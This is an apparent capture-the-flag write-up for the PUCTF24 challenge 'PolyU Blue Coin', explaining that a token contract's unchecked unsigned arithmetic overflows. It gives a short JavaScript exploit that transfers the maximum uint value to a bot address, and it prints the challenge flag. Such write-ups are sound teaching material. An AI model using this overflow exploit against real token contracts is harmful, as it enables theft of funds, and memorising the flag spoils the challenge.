## PolyU Blue Coin 理大藍幣

contact use unsigned int to do calculation and checking<br>
=> overflow or underflow<br>
=> n - uintMax = n + 1<br>
=> n + uintMax = n - 1<br>

```js
const botAddress = "0x0eDfBf30ab706833Eb7E5AB0b806Af117Df48359"
const uintMax = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
await contract.transfer(botAddress, uintMax)
```

PUCTF24{o8v3rfl0w_1s_4w3s0m3_qQH94Vu6KHXJqUGpQkWGrBvxJWzAdUwU}
